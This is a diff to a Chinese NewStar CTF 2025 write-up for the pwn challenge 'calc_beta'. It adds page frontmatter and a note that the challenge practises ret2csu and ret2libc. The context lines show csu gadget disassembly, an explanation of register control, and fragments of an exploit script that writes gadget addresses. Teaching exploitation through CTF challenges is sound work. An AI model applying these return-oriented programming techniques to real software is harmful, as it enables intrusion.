@@ -1,4 +1,17 @@
+---
+titleTemplate: ":title | WriteUp - NewStar CTF 2025"
+---
+
+<script setup>
+import Container from '@/components/docs/Container.vue'
+</script>
+
 # calc_beta
+
+<Container type='info'>
+
+本题考查简单的 ret2csu 和 ret2libc 利用。
+</Container>
 
 本题打法很多，除了新生要学但又不太常用的 `ret2csu`，还有很多打法。
 
@@ -21,7 +34,7 @@
   40124e:	41 5d                	pop    r13
   401250:	41 5e                	pop    r14
   401252:	41 5f                	pop    r15
-  401254:	c3                   	ret    
+  401254:	c3                   	ret
 ```
 
 如上，我们可以用 `pop` 控制 `rbx rbp r12 r13 r14 r15` 六个寄存器，然后再在上面的分支里面，间接控制 `rdx`，`rsi`，`edi` 寄存器，也可以控制执行流 `call [r12+rbx*8]`。
@@ -130,7 +143,7 @@ def pwn():
     edit(5, 0)
     edit(6, rdi+1)
     edit(7, saddr)
-    
+
     pause()
     edit(0, rdi)
 
